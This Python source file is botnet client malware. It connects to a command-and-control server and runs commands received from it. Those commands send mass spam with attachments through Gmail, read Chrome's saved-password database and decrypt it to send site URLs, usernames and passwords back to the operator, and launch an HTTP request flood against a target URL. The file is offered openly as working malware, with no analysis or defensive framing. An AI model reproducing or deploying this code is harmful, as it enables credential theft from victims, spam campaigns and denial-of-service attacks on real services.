import socket, threading
import time
import smtplib, email
import os, sqlite3, win32crypt
import requests

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def CLreciever(leng, client):    # function that returns client recieve
    data = ''.encode()
    while int(leng) > 1024:
        d = client.recv(1024)
        leng = int(leng) - 1024
        data += d
    d = client.recv(1024)
    data += d
    return data

class Botnet:
    def __init__(self):
        self.privateKey = RSA.generate(1024)
        self.publicKey = self.privateKey.publickey()

        self.encryptingKey = b""
        self.currentDDoS = None
        self.stopDDoSbool = False
    def connection(self):
        while True:
            try:
                self.stopDDoSbool = True
                self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client.connect(("127.0.0.1", 36983))
                time.sleep(1)
                while("-----BEGIN PUBLIC KEY-----" not in self.encryptingKey.decode()):
                        self.encryptingKey = self.client.recv(10200)
                self.client.send(self.publicKey.exportKey())
                while True:
                    cmd = self.client.recv(1024).decode()
                    print(cmd)


                    if cmd.split(" ")[0] == "%$mailSpam":

                        file = ""
                        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                        msg = email.message.EmailMessage()

                        leng = cmd.split("$filelength: ")[1].split(" $filename:")[0]
                        if int(leng) > 0:
                            file = CLreciever(leng, self.client)

                        threading.Thread(target=self.mail_mass, args=[cmd, leng, file]).start()

                    elif cmd.split(" ")[0] == "%$chromePass":
                        self.chrome_pass()

                    elif cmd.split(" ")[0] == "%$DDoS":
                        self.stopDDoSbool = False
                        self.currentDDoS = threading.Thread(target=self.ddos, args=[cmd])
                        self.currentDDoS.start()

                    elif cmd.split(" ")[0] == "%$StopDDoS":
                        try:
                            self.stopDDoSbool = True
                        except:
                            pass

            except:
                pass

    def mail_mass(self, cmd, leng, file):
        try:
            User = cmd.split(" ")[2]
            Pass = cmd.split(" ")[4]

            mails = []

            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            msg = email.message.EmailMessage()

            msg['Subject'] = cmd.split("$subject: ")[1].split(" $filelength: ")[0]
            msg['From'] = User
            msg.set_content(cmd.split("$text: ")[-1])

            if int(leng) > 0:
                msg.add_attachment(file, maintype='application', subtype='octet-stream', filename=cmd.split("$filename: ")[1].split(" $text:")[0])

            server.login(User, Pass)
            for i in range(6, cmd.split(" ").index("$subject:") - 1):
                print("a")
                msg['To'] = cmd.split()[i]
                server.send_message(msg)
                print("Sent")
            server.quit()
        except Exception as e:
             print(e)


    def chrome_pass(self):
        usrpass = ""
        try:
            data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
            c = sqlite3.connect(data_path)
            cursor = c.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            login_data = cursor.fetchall()
            for url, user_name, pwd in login_data:
                pwd = win32crypt.CryptUnprotectData(pwd)[1].decode()
                if (pwd and user_name != ""):
                    usrpass = usrpass + url + " " + user_name + " " + pwd + "\n"
            self.client.send(usrpass.encode())
        except:
            self.client.send("Error!")
            pass

    def ddos(self, cmd):
        try:
            url = cmd.split(" ")[-1]
        except:
            pass


        while self.stopDDoSbool is not True:
            threading.Thread(target=self.distributed_denial_of_service_attack, args=[url]).start()


    def distributed_denial_of_service_attack(self, url):
        try:
            print(requests.get(url))
        except:
            pass

bot = Botnet()
bot.connection()